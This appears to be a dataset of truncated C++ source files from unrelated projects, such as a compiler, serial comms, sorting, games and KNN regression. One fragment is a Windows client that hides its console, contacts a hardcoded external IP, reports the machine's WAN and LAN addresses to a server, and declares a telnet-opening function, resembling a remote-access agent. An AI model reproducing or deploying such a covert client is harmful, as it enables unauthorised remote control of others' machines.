0;\t\t\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u6d3b\u52a8\u6808\u6808\u9876\u6307\u9488\nint sp = 0;\t\t\t\t\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u5f53\u524d\u8fc7\u7a0b\u7684\u8d77\u59cb\u6307\u9488\nint entry_top = 0;\t\t\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u6808\u5f0f\u7b26\u53f7\u8868\u7684\u6808\u9876\nint cru_level = 0;\t\t\t\t\t\t\t\t\t\t//\u5d4c\u5957\u5c42\u6570\n\nint point = 0;\t\t\t\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u5168\u5c40\u6307\u9488\nint row = 0;\t\t\t\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u5f53\u524d\u8bc6\u522b\u884c\nint word_point = 0;\t\t\t\t\t\t\t\t\t\t//\u5b9a\u4e49\u6bcf\u4e00\u4e2a\u8bed\u6cd5\u5355\u4f4d\u7684\u6307\u9488\nWord tword;\t\t\t\t\t\t\t\t\t\t\t\t//\u5168\u5c40\u7684\u5355\u8bcd\u7f13\u5b58\n\n/*******************************************\u5b9a\u4e49\u51fd\u6570\u58f0\u660e**************************************************/\nint changeNum(string);\nvoid initErrors();\nvoid trim(string&);\nbool isDigit(char);\nbool isLetter(char);\nbool isSymbol(char);\nvoid readProperitesToSet(string, string);\nvoid checkIsNumber(string);\nvoid reservedOrIdentifier(string);\nvoid checkIsWord(string);\nvoid checkIsSymbol(string);\nvoid checkOthers(string);\nvoid startAnalysis(string);\nvoid lexicalAnalysis(string);\nbool synchronous(int);\nvoid pushError(int id, int type = 1, string content = \"\");\nWord getNextWord();\nvoid errorWhile(int, int);\nvoid constAnalyzer();\nvoid condeclAnalyzer();\nvoid vardeclAnalyzer();\nvoid procedureAnalyzer();\nvoid factorAnalyzer();\nvoid termAnalyzer();\nvoid expAnalyzer();\nvoid lexpAnalyzer();\nvoid expRecursion(string, int&);\nvoid expPaAnalyzer(string, int&);\nvoid idRecursion(string);\nvoid idPaAnalyzer(string);\nvoid stateAnalyzer();\nvoid stateWhile();\nvoid bodyAnalyzer();\nvoid blockAnalyzer();\nvoid progAnalyzer();\nvoid syntaxAnalyzer();\nvoid errorWhile(int, int);\nvoid addEntry(string name, string kind, int level, int val = INF);\nvoid delEntry();\npair<int, int> searchEntry(string);\nvoid updateEntry(string, int);\nint judgeDefined(string);\nint emitCode(string op_name, int level = 0, int op_num = INF);\nvoid backPatch(int, int);\nint oprType(string);\nint getSize();\nint findVal(int, int);\nvoid setVal(int, int, int);\npair<int, int>getTwoTop();\nint getStaticChain(int);\nint codeAnalyzer(int);\nvoid interpreter();\n\n\n/*******************************************\u5de5\u5177\u51fd\u6570**************************************************/\nint changeNum(string str) {\n\tint len = str.size();\n\tint j = 1;\n\tint ans = 0;\n\tfor (int i = len - 1; i >= 0; i--) {\n\t\tans += j * (str[i] - '0' + 0);\n\t\tj *= 10;\n\t}\n\treturn ans;\n}\nvoid initErrors() {\n\t//\u5b9a\u4e49\u76f8\u5e94\u7684\u9519\u8bef\u521d\u59cb\u5316\u7a0b\u5e8f\uff0c\u8bed\u6cd5\u5206\u6790\u5176\u8fd0\u884c\u524d\u5c06\u6240\u6709\u9519\u8bef\u52a0\u5165\u8868\u4e2d\n\tall_errors[1] = \"Identifier Cannot Start With A Number\";\t\t\t//\u6807\u8bc6\u7b26\u6570\u5b57\u5f00\u5934\n\tall_errors[2] = \"Assignment Symbol Is Missing \u2018=\u2019.\";\t\t\t\t//\u8d4b\u503c\u7b26\u53f7\u9519\u8bef\n\tall_errors[3] = \"Unknown Lexical Error\";\t\t\t\t\t\t\t//\u672a\u77e5\u7684\u8bcd\u6cd5\u9519\u8bef\n\n\tall_errors[4] = \"Invalid Or Missing RESERVED 'program'\";\t\t\t//pr",
    "#include \"serial_comms/serial_comms.hpp\"\n\nSerialComms::SerialComms() : serial_connected(false), serial_port(0), cmdVelL(0), cmdVelR(0), distL(0), distR(0) { }\n\nvoid SerialComms::setup(std::string uart_port)\n{\n  serial_port = open(uart_port.c_str(),  O_RDWR);\n  \n  if(tcgetattr(serial_port, &tty) != 0)\n  {\n    printf(\"Error %i from tcgetattr: %s\\n\", errno, strerror(errno));\n    serial_connected=false;\n  }\n  else\n  {\n    serial_connected=true;\n  }\n\n  tty.c_cflag &= ~PARENB;\n  tty.c_cflag &= ~CSTOPB;\n  tty.c_cflag &= ~CSIZE;\n  tty.c_cflag |= CS8;\n  tty.c_cflag &= ~CRTSCTS;\n  tty.c_cflag |= CREAD | CLOCAL;\n  tty.c_lflag &= ~ICANON;\n  tty.c_lflag &= ~ECHO;\n  tty.c_lflag &= ~ECHOE;\n  tty.c_lflag &= ~ECHONL;\n  tty.c_lflag &= ~ISIG;\n  tty.c_iflag &= ~(IXON | IXOFF | IXANY);\n  tty.c_iflag &= ~(IGNBRK|BRKINT|PARMRK|ISTRIP|INLCR|IGNCR|ICRNL);\n  tty.c_oflag &= ~OPOST;\n  tty.c_oflag &= ~ONLCR;\n  tty.c_cc[VTIME] = 10; // tenths of a second elapses between bytes, see http://unixwiz.net/techtips/termios-vmin-vtime.html\n  tty.c_cc[VMIN] = 85;  // characters have been received, with no more data available\n  cfsetispeed(&tty, B115200);\n  cfsetospeed(&tty, B115200);\n}\n\n// void setPidValues(float k_p, float k_d, float k_i, float k_o)\n// {;}\n\nbool SerialComms::connected()\n{ \n  return serial_connected; \n}\n\nbool SerialComms::serialConnection()\n{\n  if (tcsetattr(serial_port, TCSANOW, &tty) != 0)\n  {\n    std::cout << \"error \" << errno << \" from tcsetattr: \" << strerror(errno) << std::endl;\n    serial_connected=false;\n  }   \n  else\n  {\n    serial_connected=true;\n  }\n  return serial_connected;\n}\n\nvoid SerialComms::sendMsg(char* msg, int len)\n{\n  write(serial_port, msg, len);\n  //usleep(2000); \t// wait need for transmit all data to uController before the next cycle \n}\n\nvoid SerialComms::closeComms()\n{\n  close(serial_port);\n}\n\nint SerialComms::receiveMsg(int len)\n{\n  // For variable length array\n  char * read_buf;\n  read_buf = (char *)calloc(len, sizeof(char));\n  // Read uart receive buffer\n  int num_bytes = read(serial_port, read_buf, len);\n  if (num_bytes < 0)\n  {\n    std::cout << \"Error reading: \" << strerror(errno) << std::endl;\n    free(read_buf);\n    return 1;\n  }\n\n  // Extract string and convert to double\n  std::string str_ = (char*) read_buf; \t// convert to string for using substr method\n//  std::cout << \"read_buf is : \" << read_buf << std::endl; \n  std::string encLeftTicks_str = str_.substr(0, 6);\n  std::string encRightTicks_str = str_.substr(6, 6);\n  encLeftTicks = std::stod(encLeftTicks_str);\n  encRightTicks = std::stod(encRightTicks_str);\n\n  free(read_buf);\n  return 0;\n}\n\ndouble SerialComms::getCmdVelL()\n{\n  return cmdVelL;\n}\ndouble SerialComms::getCmdVelR()\n{\n  return cmdVelR;\n}\ndouble SerialComms::getDistL()\n{\n  return distL;\n}\ndouble SerialComms::getDistR()\n{\n  return distR;\n}\n\nint16_t SerialComms::getEncLeftTicks()\n{\n  return encLeftTicks;\n}\n\nint16_t SerialComms::getEncRightTicks()\n{\n  return encRightTicks;\n}\n\nint SerialComms::dtoa(char* str, double input, int strlen)  // Limitation -999999999.9999999999 to 9999999999.9999999999\n{\n        if(input >999999999 || input <-999999999)\n        {\n                printf(\" Error: Input number shall be limited between -999,999,999 till 999,999,999\");\n                return 1;\n        }\n\n        int digit_max = (strlen - 2)/2;         // Number of digits equal for both before and after decimal point.\n                                                // e.g. strlen=22, minus decimal point minus '\\0' = (22-1-1)/2=10 digits on each side\n        int32_t int_num;\n        int64_t deci_num; // 32bit only until 2,147,483,647, therefore need 64bit to reach 9,999,999,999\n        float deci_num_f;\n        //char int_array[digit_max] = {0};\n        // For variable length array\n        char * int_array;\n        int_array = (char*)calloc(digit_max, sizeof(char));\n        int_array[0] = '0';     // For the first character, if hte number start with 0.XXXXX\n\n        // char deci_array[digit_max] = {0};\n        // For variable length array\n        char * deci_array;\n        deci_array = (char*)calloc(digit_max, sizeof(char));\n\n        int8_t i = 0;\n        int8_t a = 0;\n\n        int_num = (int32_t) input;\n        deci_num_f = (input - int_num);\n        deci_num = deci_num_f * pow(10, digit_max);\n\n\t// To check if negative number\n        if(input < 0)\n        {\n          int_num = int_num * (-1);\n          deci_num = deci_num * (-1);\n          str[0] = '-';\n          a = 1;\n        }\n        // Convert int to int_array and deci_array\n        while(int_num)\n        {\n          int_array[i++] = int_num % 10 + '0';\n          int_num = int_num / 10;\n        }\n        for(i=0; i < digit_max; i++)    // To cater to cases like 0.00XX, else it becomes 0.XX\n        {\n          deci_array[i] = deci_num % 10 + '0';\n          deci_num = deci_num / 10;\n        }\n        //Transfer inte_array and deci_array to str for return\n        for(i=0; i<digit_max; i++)\n        {\n          if(int_array[(digit_max-1) - i])\n      ",
    "// ConsoleApplication12.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <vector>\n#include <random>\n#include <chrono>\nusing namespace std;\nusing namespace std::chrono;\n//funcion prototipo\nvoid burbuja(vector<double>& v);\nvoid seleccion(vector<double>& v);\nvoid imprime(vector<double> v);\nint main()\n{\n    // vector con 1000 elementos\n    vector<double> v1000;\n    random_device rd;\n    default_random_engine gen(rd());\n    uniform_real_distribution<double>\n        distribution(1.5, 1.90);\n\n    // generar 1000 datos con una\n    // instrucci\u00f3n c\u00edclico\n    for (int i = 0; i < 20; i++)\n    {\n        double num = distribution(gen);\n        v1000.push_back(num);\n    }\n    //imprime(v1000);\n    auto start1000 = high_resolution_clock::now();\n    seleccion(v1000);\n    auto stop1000 = high_resolution_clock::now();\n    auto duration1000 = \n        duration_cast<milliseconds>(stop1000 - \n            start1000);\n    cout << \"Duracion \" << duration1000.count();\n    //imprime(v1000);\n}\n\nvoid seleccion(vector<double>& v) \n{\n    int indiceMin = 0;\n    for (int i = 0; i < v.size(); i++) \n    {\n        indiceMin = i;\n        for (int j = i + 1; j < v.size(); j++) \n        {\n            if (v[j] < v[indiceMin]) \n            {\n                indiceMin = j;\n            }\n        }\n        double temp = v[indiceMin];\n        v[indiceMin] = v[i];\n        v[i] = temp;\n    }\n}\n\nvoid burbuja(vector<double> &v)\n{\n    double temp = 0;\n    bool swapp = true;\n\n    while (swapp) \n    {\n        swapp = false;\n        for (int i = 0; i < v.size()-1; i++) \n        {\n            if (v[i] > v[i+1]) \n            {\n                temp = v[i + 1];\n                v[i + 1] = v[i];\n                v[i] = temp;\n                swapp = true;\n            }\n        }\n    }\n}\n\nvoid imprime(vector<double> v)\n{\n    for (auto elemento : v)\n    {\n        cout << elemento << \" , \";\n    }\n    cout << endl;\n    system(\"pause\");\n    system(\"cls\");\n}\n",
    "\n// \u8bbe\u7f6e\u8fde\u63a5\u5668\u9009\u9879\n#pragma comment(linker, \"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\")\n#include <winsock2.h>\n#include <ws2tcpip.h>\n// #include <windows.h>\n#include <stdio.h>\n#include <iostream>\n#include <thread>\n#include <random>\n#include <time.h>\n#include <string>\n#include <string.h>\n#include <winternl.h>\n#include <intrin.h>\n#include <fstream>\n#include <atomic>\n#include <sstream>\n#include \"..\\\\isdebug.h\"\n#pragma comment(lib, \"ws2_32\")\nint MasterPort;\nusing namespace std;\nstring ip;\nint serverPort;\nbool ServerState = false;\nstring SEID;\nSOCKET HealthyBeat;\n\nstd::atomic<bool> ServerHealthCheck(false);\nstring GetFirstLocalIPAddress();\n// void sendToServer(bool state = true);\nvoid open_telnet();\nvoid HealthCheck();\nBOOL WINAPI HandlerRoutine(DWORD dwCtrlType);\nbool send_message(SOCKET sock, const std::string &message)\n{\n\tstd::ostringstream oss;\n\toss << message.size() << \"\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\"\n\t\t<< message; // \u6784\u5efa\u6d88\u606f\uff0c\u5305\u542b\u957f\u5ea6\u548c\u5b9e\u9645\u6570\u636e\n\tstd::string formatted_message = oss.str();\n\n\tint total_sent = 0;\n\tint message_length = formatted_message.size();\n\tconst char *data = formatted_message.c_str();\n\n\twhile (total_sent < message_length)\n\t{\n\t\tint bytes_sent = send(sock, data + total_sent, message_length - total_sent, 0);\n\t\tif (bytes_sent == SOCKET_ERROR)\n\t\t{\n\t\t\treturn false; // \u53d1\u9001\u5931\u8d25\n\t\t}\n\t\ttotal_sent += bytes_sent;\n\t}\n\treturn true; // \u53d1\u9001\u6210\u529f\n}\nbool receive_message(SOCKET sock, std::string &message)\n{\n\tstd::string length_str;\n\tchar buffer[16384] = {0};\n\tint received;\n\n\t// \u9996\u5148\u8bfb\u53d6\u957f\u5ea6\u90e8\u5206\uff0c\u76f4\u5230\u63a5\u6536\u5230 \\r\\n\n\twhile (true)\n\t{\n\t\treceived = recv(sock, buffer, 1, 0); // \u6bcf\u6b21\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\n\t\tif (received <= 0)\n\t\t{\n\t\t\treturn false; // \u8fde\u63a5\u65ad\u5f00\u6216\u8bfb\u53d6\u51fa\u9519\n\t\t}\n\t\tif (buffer[0] == '\\r')\n\t\t{\n\t\t\t// \u7ee7\u7eed\u8bfb\u53d6\\n\n\t\t\treceived = recv(sock, buffer, 1, 0);\n\t\t\tif (received <= 0 || buffer[0] != '\\n')\n\t\t\t{\n\t\t\t\treturn false; // \u683c\u5f0f\u9519\u8bef\n\t\t\t}\n\n\t\t\tfor (int i = 1; i <= 4; i++)\n\t\t\t{\n\t\t\t\treceived = recv(sock, buffer, 1, 0);\n\t\t\t\tif (received <= 0 || buffer[0] != '\\r')\n\t\t\t\t{\n\t\t\t\t\treturn false; // \u683c\u5f0f\u9519\u8bef\n\t\t\t\t}\n\t\t\t\treceived = recv(sock, buffer, 1, 0);\n\t\t\t\tif (received <= 0 || buffer[0] != '\\n')\n\t\t\t\t{\n\t\t\t\t\treturn false; // \u683c\u5f0f\u9519\u8bef\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak; // \u8bfb\u53d6\u5230 \\r\\n\uff0c\u9000\u51fa\u5faa\u73af\n\t\t}\n\t\tlength_str += buffer[0];\n\t}\n\n\tint data_length = std::stoi(length_str); // \u8f6c\u6362\u957f\u5ea6\u5b57\u7b26\u4e32\u4e3a\u6574\u6570\n\tmessage.resize(data_length);\n\n\tint total_received = 0;\n\twhile (total_received < data_length)\n\t{\n\t\treceived = recv(sock, &message[total_received], data_length - total_received, 0);\n\t\tif (received <= 0)\n\t\t{\n\t\t\treturn false; // \u8fde\u63a5\u65ad\u5f00\u6216\u8bfb\u53d6\u51fa\u9519\n\t\t}\n\t\ttotal_received += received;\n\t}\n\n\treturn true; // \u63a5\u6536\u6210\u529f\n}\nstring getMyWanIp()\n{\n\tWSADATA wsaData;\n\tSOCKADDR_IN addr;\n\tWSAStartup(MAKEWORD(2, 2), &wsaData);\n\tSOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\taddr.sin_family = AF_INET;\n\taddr.sin_port = htons(2063);\n\taddr.sin_addr.s_addr = inet_addr(\"43.138.236.72\");\n\tconnect(s, (SOCKADDR *)&addr, sizeof(addr));\n\tchar buf[1024];\n\trecv(s, buf, 1024, 0);\n\treturn buf;\n}\n\nstd::string getMyLanIp()\n{\n\tWSADATA wsaData;\n\tchar hostname[256];\n\tstruct addrinfo hints, *result = nullptr;\n\tstruct addrinfo *ptr = nullptr;\n\tchar ip[INET_ADDRSTRLEN];\n\tstd::string ipAddress;\n\n\t// Initialize Winsock\n\tif (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)\n\t{\n\t\tstd::cerr << \"WSAStartup failed\" << std::endl;\n\t\treturn \"\";\n\t}\n\n\t// Get the local hostname\n\tif (gethostname(hostname, sizeof(hostname)) != 0)\n\t{\n\t\tstd::cerr << \"Error getting hostname\" << std::endl;\n\t\tWSACleanup();\n\t\treturn \"\";\n\t}\n\n\t// Set up hints for getaddrinfo\n\tZeroMemory(&hints, sizeof(hints));\n\thints.ai_family = AF_INET; // IPv4 only\n\thints.ai_socktype = SOCK_STREAM;\n\thints.ai_protocol = IPPROTO_TCP;\n\n\t// Get address info\n\tif (getaddrinfo(hostname, nullptr, &hints, &result) != 0)\n\t{\n\t\tstd::cerr << \"Error getting address info\" << std::endl;\n\t\tWSACleanup();\n\t\treturn \"\";\n\t}\n\n\t// Iterate through the address list and find the first IPv4 address\n\tfor (ptr = result; ptr != nullptr; ptr = ptr->ai_next)\n\t{\n\t\tif (ptr->ai_family == AF_INET)\n\t\t{\n\t\t\tstruct sockaddr_in *ipv4 = (struct sockaddr_in *)ptr->ai_addr;\n\t\t\tinet_ntop(AF_INET, &(ipv4->sin_addr), ip, sizeof(ip));\n\t\t\tipAddress = ip;\n\t\t\tbreak; // Only get the first available IPv4 address\n\t\t}\n\t}\n\n\t// Clean up\n\tfreeaddrinfo(result);\n\tWSACleanup();\n\n\treturn ipAddress;\n}\nSOCKET s;\nWSADATA wsaData;\nSOCKADDR_IN addr, addr2;\nvoid GetConnectForServer(bool state = true)\n{\n\n\tWSAStartup(MAKEWORD(2, 2), &wsaData);\n\ts = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\taddr.sin_family = AF_INET;\n\taddr.sin_port = htons(serverPort);\n\taddr.sin_addr.s_addr = inet_addr(ip.c_str());\n\twhile (connect(s, (SOCKADDR *)&addr, sizeof(addr)) != 0)\n\t\t;\n\tstd::string lanip = getMyLanIp();\n\tstring wanip = getMyWanIp();\n\tsend_message(s, \"Client\");\n\tstring buf;\n\treceive_message(s, buf);\n\tif (strcmp(((string)buf).c_str(), \"Recv\") == 0)\n\t{\n\t\tcout << \"OD\";\n\t\tstring sendBuf = wanip + \" \" + lanip + \" \" + to_string(MasterPort);\n\t\tsend_message(s, sendBuf);\n\t\treceive_message(s, buf);\n\t\tSEID = buf;\n\t\tHealthyBeat = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\t\taddr2.sin_family = AF_INET;\n\t\taddr2.sin_port = htons(serverPort);\n\t\taddr2.sin_addr.s_addr",
    "#include \"ship.h\"\n\n#include <vector>\n#include <stdexcept>\n\nShip::Ship() = default;\n\nShip::Ship(int size)\n{\n    if (size < kMinSize || size > kMaxSize) {\n        throw std::logic_error(\"Ship size can be from 1 to 4\");\n    }\n\n    size_ = size;\n\n    for (int i = 0; i < size_; i++) {\n        segments_.push_back(ShipSegment());\n    }\n}\n\nShip::~Ship()\n{\n    segments_.clear();\n}\n\nint Ship::getSize() const noexcept\n{\n    return size_;\n}\n\nShipSegmentStatus Ship::getSegmentStatus(int index) const\n{\n    if (index < 0 || index >= size_) {\n        throw std::out_of_range(\"Ship segment index out of range\");\n    }\n\n    return segments_[index].getStatus();\n}\n\nShipStatus Ship::getShipStatus() const noexcept\n{\n    int dead_flag = 1;\n    for (int i = 0; i < size_; i++) {\n        if (segments_[i].getStatus() != ShipSegmentStatus::destroyed) {\n            dead_flag = 0;\n            break;\n        }\n    }\n\n    if (dead_flag) {\n        return ShipStatus::dead;\n    } else {\n        return ShipStatus::alive;\n    }\n}\n\nvoid Ship::damageSegment(int index, int damage)\n{\n    if (index < 0 || index >= size_) {\n        throw std::out_of_range(\"Ship segment index out of range\");\n    }\n\n    segments_[index].takeDamege(damage);\n}\n\nvoid Ship::healSegment(int index, int heal)\n{\n    if (index < 0 || index >= size_) {\n        throw std::out_of_range(\"Ship segment index out of range\");\n    }\n\n    segments_[index].takeHeal(heal);\n}\n\nShip::ShipSegment::ShipSegment()\n{\n    health_ = kMaxHealth;\n}\n\nvoid Ship::ShipSegment::takeDamege(int damage)\n{\n    if (damage < 0) {\n        throw std::invalid_argument(\"Damage can't be negative\");\n    }\n\n    health_ = std::max(0, health_ - damage);\n}\n\nvoid Ship::ShipSegment::takeHeal(int heal)\n{\n    if (heal < 0) {\n        throw std::invalid_argument(\"Heal can't be negative\");\n    }\n\n    health_ = std::min(kMaxHealth, health_ + heal);\n}\n\nShipSegmentStatus Ship::ShipSegment::getStatus() const noexcept\n{\n    if (health_ == kMaxHealth) {\n        return ShipSegmentStatus::intact;\n    } else if (health_ == 0) {\n        return ShipSegmentStatus::destroyed;\n    } else {\n        return ShipSegmentStatus::damaged;\n    }\n}",
    "#include <iostream>\r\n#include<vector>\r\n#include<cstdlib>\r\nusing namespace std;\r\n\r\n//program to find maximum number of thieves can be caught .\r\nint FindThiefs(char PT[], int Size , int d)//d:distance between thief and police man , PT:array of characters.\r\n{\r\n    int caught=0,a=0,b=0;//a,b:counters\r\n    vector<int>T;//T:thief\r\n    vector<int>P;//P:police\r\n    for(int i=0;i<Size;i++)//divide characters of the array to 2 vectors :one for thief and one for police and storing their values .\r\n    {\r\n        if(PT[i]=='p')\r\n            P.push_back(i);\r\n        else if (PT[i]=='t')\r\n            T.push_back(i);\r\n    }\r\n    while(a<T.size()&&a<P.size())\r\n    {\r\n        if(abs(T[a]-P[b])<=d)//abs:to return the absolute value\r\n        {\r\n            a++;\r\n            b++;\r\n            caught++;\r\n        }\r\n        else if (T[a]<P[b])\r\n            a++;\r\n        else\r\n            b++;\r\n    }\r\n    return caught;\r\n}\r\n\r\n\r\n\r\nint main()\r\n{\r\n    int d=1,Size;\r\n    char PT[] ={'p','t','t','p','t'};\r\n    Size=sizeof(PT)/sizeof(PT[0]);\r\n    cout << \"the maximum number of thieves can  caught by police :\" << endl;\r\n    cout<<FindThiefs(PT,Size,d)<<endl;\r\n    return 0;\r\n}\r\n",
    "#include<iostream>\n//#include \"pieces.h\"\n#include \"settheboard.h\"\nusing namespace std;\n\nint main(){\n    settheboard();\n     \n    bool condition1 , condition2;\n\n    bool iskingmatte = 0;\n    char turn = 'w';\n    int origin_locx , origin_locy, destination_locx , destination_locy;\n    int origin ;\n    int destination;\n    \n   cout<<\"BEGIN : WHITE STARTS)\"<<endl;\n    while(!is_king_matte(turn)){\n\n        cout<<\"player number \"<<turn<<\" turn : \"<<endl;\n        cin>>origin>>destination;\n        origin_locx=origin/10;\n        origin_locy=origin%10;\n        destination_locx=destination/10;\n        destination_locy=destination%10;\n        condition1=is_origin_valid(origin_locx,origin_locy,turn);\n        if(condition1){\n        condition2=is_destination_valid(origin_locx,origin_locy,destination_locx,destination_locy,turn);\n        if(condition1 && condition2){\n           // delete[] boardpieces[destination_locx][destination_locy]->possible_locs;\n            \n            if(turn=='w'){\n                turn='b';\n                if(board[origin_locx][origin_locy]=='k'){\n                pos_i_kingw=destination_locx;\n                pos_j_kingw=destination_locy;\n            }\n            }\n            else{\n                turn='w';\n                if(board[origin_locx][origin_locy]=='k'){\n                pos_i_kingb=destination_locx;\n                pos_j_kingb=destination_locy;\n            }\n            }\n        }\n        }\n\n    }\n    if(turn == 'b'){\n    cout<<turn<<\"lack player is matte\"<<endl;\n    cout<<\"congrats  WHITE PLAYER WINS!!!! \"<<endl;\n\n    }\n    else {\n    cout<<turn<<\"hite player is matte\"<<endl;\n    cout<<\"congrats  BLACK PLAYER WINS!!!! \"<<endl;\n\n    }\n\n}",
    "#include \"KNNRegression.h\"\n#include \"../DataUtils/DataLoader.h\"\n#include \"../Utils/SimilarityFunctions.h\"\n#include \"../Evaluation/Metrics.h\"\n#include \"../DataUtils/DataPreprocessor.h\"\n#include <cmath>\n#include <string>\n#include <algorithm>\n#include <utility>\n#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <map>\n#include <random>\n#include <unordered_map> \nusing namespace System::Windows::Forms; // For MessageBox\n\n\n                                                ///  KNNRegression class implementation  ///\n\n\n/// KNNRegression function: Constructor for KNNRegression class, initializing the number of neighbors to use for prediction./// \nKNNRegression::KNNRegression(int k) : k_(k) {}\n\n\n/// fit function: Fits the KNNRegression model with the given training data. ///\nvoid KNNRegression::fit(const std::vector<std::vector<double>>& X_train, const std::vector<double>& y_train) {\n\tX_train_ = X_train;\n\ty_train_ = y_train;\n}\n\n\n\n/// predict function: Calculates the predicted values for a given set of test data points using KNN Regression. ///\nstd::vector<double> KNNRegression::predict(const std::vector<std::vector<double>>& X_test) const {\n\tstd::vector<double> y_pred; // Store predicted values for all test data points\n\ty_pred.reserve(X_test.size()); // Reserve memory for y_pred to avoid frequent reallocation\n\n\t// Check if training data is empty\n\tif (X_train_.empty() || y_train_.empty()) {\n\t\tthrow std::runtime_error(\"Error: Empty training data.\");\n\t}\n\n\t/* Implement the following:\n\t\t--- Loop through each test data point\n\t\t--- Calculate Euclidean distance between test data point and each training data point\n\t\t--- Loop through the labels and their counts to find the most frequent label\n\t\t--- Store sum of y_train values for k-nearest neighbors\n\t\t--- Calculate average of y_train values for k-nearest neighbors\n\t*/\n\t\n\t//TODO\n\n    for (const auto& test_point : X_test) {\n        std::vector<std::pair<double, int>> distances; \n\n        for (int i = 0; i < this->X_train_.size(); i++) {\n            double distance = 0.0;\n            for (int j = 0; j < test_point.size(); j++) {\n                distance += SimilarityFunctions::euclideanDistance(test_point, this->X_train_[i]);\n            }\n            distances.emplace_back(std::sqrt(distance), i); \n        }\n\n        std::sort(distances.begin(), distances.end());\n\n        double y_sum = 0.0;\n        for (int i = 0; i < this->k_; i++) {\n            y_sum += this->y_train_[distances[i].second]; \n        }\n\n        double y_avg = y_sum / this->k_;\n\n        y_pred.push_back(y_avg);\n    }\n\n\n\treturn y_pred; // Return vector of predicted values for all test data points\n}\n\n\n\n/// runKNNRegression: this function runs the KNN regression algorithm on the given dataset and \n/// then returns a tuple containing the evaluation metrics for the training and test sets, \n/// as well as the labels and predictions for the training and test sets.///\nstd::tuple<double, double, double, double, double, double,\n    std::vector<double>, std::vector<double>,\n    std::vector<double>, std::vector<double>>\n    KNNRegression::runKNNRegression(const std::string& filePath, int trainingRatio) {\n    try {\n        // Check if the file path is empty\n        if (filePath.empty()) {\n            MessageBox::Show(\"Please browse and select the dataset file from your PC.\");\n            return {}; // Return an empty vector since there's no valid file path\n        }\n\n        // Attempt to open the file\n        std::ifstream file(filePath);\n        if (!file.is_open()) {\n            MessageBox::Show(\"Failed to open the dataset file\");\n            return {}; // Return an empty vector since file couldn't be opened\n        }\n        // Load the dataset from the file path\n        std::vector<std::vector<std::string>> data = DataLoader::readDatasetFromFilePath(filePath);\n\n        // Convert the dataset from strings to doubles\n        std::vector<std::vector<double>> dataset;\n        bool isFirstRow = true; // Flag to identify the first row\n\n        for (const auto& row : data) {\n            if (isFirstRow) {\n                isFirstRow = false;\n                continue; // Skip the first row (header)\n            }\n\n            std::vector<double> convertedRow;\n            for (const auto& cell : row) {\n                try {\n                    double value = std::stod(cell);\n                    convertedRow.push_back(value);\n                }\n                catch (const std::exception& e) {\n                    // Handle the exception or set a default value\n                    std::cerr << \"Error converting value: \" << cell << std::endl;\n                    // You can choose to set a default value or handle the error as needed\n                }\n            }\n            dataset.push_back(convertedRow);\n        }\n\n        // Split the dataset into training and test sets (e.g., 80% for training, 20% for testing)\n        double trainRatio = trainingRatio * 0.01;\n\n        std::vector<std::vector<double>>",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"beach_suitablility_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"BroadCastShowWindow.h\"\n#include <string>\n#include <iostream>\n#include \"glob.h\"\n\nusing std::wstring;\n\nHINSTANCE hinstance;\nwstring* target;\nATOM BgetRegisteredClass(HINSTANCE instance) {\n\tWNDCLASSEX ex;\n\tex.cbSize = sizeof(WNDCLASSEX);\n\tex.lpfnWndProc = BWndProc;\n\tex.cbClsExtra = 0;\n\tex.cbWndExtra = 0;\n\tex.hInstance = instance;\n\tex.hIcon = LoadIcon(instance, IDI_APPLICATION);\n\tex.hCursor = LoadCursor(NULL, IDC_ARROW);\n\tex.hIconSm = LoadIcon(ex.hInstance, NULL);\n\tex.style = CS_NOCLOSE | CS_OWNDC | CS_DBLCLKS;\n\tex.hbrBackground = CreateSolidBrush(RGB(0,0,0));\n\tex.lpszClassName = TEXT(\"BroadCastWin\");\n\tex.lpszMenuName = NULL;\n\n\treturn RegisterClassExW(&ex);\n}\n\nBOOL BcreateWindow(\n\tHINSTANCE instance\n) {\n\tHWND hwnd = CreateWindow(TEXT(\"BroadCastWin\"), TEXT(\"Broadcast\"), WS_POPUP | WS_MAXIMIZE, 0, 0,0,0, NULL, NULL, instance, NULL);\n\tif (!hwnd) return FALSE;\n\tShowWindow(hwnd, SW_SHOW);\n\tUpdateWindow(hwnd);\n\treturn TRUE;\n}\n\n\nLRESULT CALLBACK BWndProc(HWND hwnd, UINT message, WPARAM wparam, LPARAM lparam) {\n\twstring ver_info=TEXT(\"Limitation Plan \u7248\u672c 